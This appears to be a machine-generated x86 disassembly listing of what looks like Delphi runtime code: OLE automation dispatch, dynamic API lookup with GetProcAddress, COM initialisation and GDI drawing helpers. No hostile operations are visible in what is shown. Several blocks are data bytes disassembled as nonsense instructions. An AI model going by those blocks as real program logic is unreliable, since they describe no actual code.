push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af78
retn
sub_46b0f0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_40403c
mov eax [ ebx ]
call sub_40854c
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_4042a8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_4044a8
mov edx esi
sub edx eax
mov eax ebx
call sub_404634
mov eax [ ebx ]
call sub_40854c
mov esi eax
sub al 0xd
je r-xdata
sub_46b140
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46b1e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404080
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40b7f4
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1ee
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40400c
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40ae54
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_408dbc
sub_46b1ee
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_46b210
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46b282
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46b0f0
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_46b140
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_40403c
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_40403c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b289
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
add esp 0xfffffff0
call sub_4035bc
sub_46b289
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_46b2dc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46b3de
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b4d0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_4058a8
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404270
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_404270
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404270
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b210
jmp sub_403a24
lea eax [ ebp - 0x8 ]
call sub_4046c8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4046c8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_4046c8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_46b4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b4d7
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40400c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4046e0
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_46b4e0
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404954
xor eax eax
push ebp
push sub_46b813
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_46b7f0
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_46bac0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404db4
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404db4
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b7f7
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404d90
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404db4
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40f26c
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_46b824
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
pop ecx
pop ecx
pop ebp
retn
sub_46b858
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_4086b4
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_46b2c4
push ebp
call sub_46b824
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46b950
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_46b938
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_46b858
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b4e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40ec78
sub_46b9ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_46bab1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b140
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_404270
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_404270
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_404270
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b210
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bab8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40400c
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_403a24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404b50
jmp r-xdata
sub_46badc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_46bacc
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_46b9ec
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_46bbc0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_46badc
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_46bbf1 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40ec78
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_46bc9c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_415654
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_415654
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_46bd14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bd8a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd91
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404a64
call CoUninitialize
sub_46bd94
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46b2dc
mov eax sub_46b950
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_46bbc0
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_46bc9c
sub_46bdec
push 0xfc0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add ch bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add dh bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46be29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46be30
retn
sub_46c285
mov esp 0x4e68b722
sbb edx [ eax ]
mov [ 0xaa00bc ] al
inc eax
inc edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 + 0x2880046 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ esi ] 0x8c
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
in al 0xc1
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
add [ ecx ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add al 0xc2
inc esi
add [ edx + eax ] dl
add [ eax ] al
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
inc eax
retn 0x46
sub_46c2ec
cwde
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ah 0xc1
inc esi
add [ eax + 0x2 ] cl
add [ eax ] al
add [ ebx + eax * 8 + 0x46 ] bl
add [ edx + eax * 8 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] ch
les eax [ esi ]
aam 0xc4
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x3c ] dh
inc esi
add dl al
les eax [ esi ]
pushfd
add al [ eax ]
add [ eax + 0x30 ] cl
inc esp
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add ah ch
aad 0x46
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax ] dh
xlat
inc esi
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add [ ebx + 0x46 ] dh
add [ eax ] ch
aad 0x46
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_46c3e6
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add ah bh
salc
inc esi
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_46ccce
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int 0x46
add [ eax + eax ] bh
add [ eax ] al
int3
sub_46cd30
push ebx
push esi
mov esi edx
mov ebx eax
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ esi ] eax
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_46cd68
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push ebx
call GlobalLock
mov eax [ eax + 0xc ]
push eax
call DeleteMetaFile
push ebx
call GlobalUnlock
push ebx
call GlobalFree
sub_46cd8c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
push rw-data
push 0x1
push 0x1
push 0x8
push 0x8
call CreateBitmap
mov edi eax
push edi
call CreatePatternBrush
push eax
push ebx
call SelectObject
mov ebp eax
push 0xffffff
push ebx
call SetTextColor
mov [ esp ] eax
push 0x0
push ebx
call SetBkColor
mov [ esp + 0x4 ] eax
push 0xa000c9
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
push ebx
call PatBlt
mov eax [ esp + 0x4 ]
push eax
push ebx
call SetBkColor
mov eax [ esp ]
push eax
push ebx
call SetTextColor
push ebp
push ebx
call SelectObject
push eax
call DeleteObject
push edi
call DeleteObject
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46ce24
push ebx
mov ebx eax
mov eax ebx
call sub_4042a8
inc eax
push eax
call CoTaskMemAlloc
push eax
mov eax ebx
call sub_4044a8
mov edx eax
pop eax
call sub_4086f0
pop ebx
retn
sub_46ce48
push ebx
push ecx
mov ebx edx
push esp
push 0x1
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
mov eax ebx
mov edx [ esp ]
call sub_404210
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop ebx
retn
sub_46ce6c
push ebx
push ecx
mov ebx edx
push esp
push 0x2
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
mov eax ebx
mov edx [ esp ]
call sub_404210
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop ebx
retn
sub_46ce90
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x264 ]
mov ecx r-xdata
call sub_4058ec
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f3c8
sub_46ced4
push ebx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov al 0x1
pop ebx
retn
sub_46cefc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
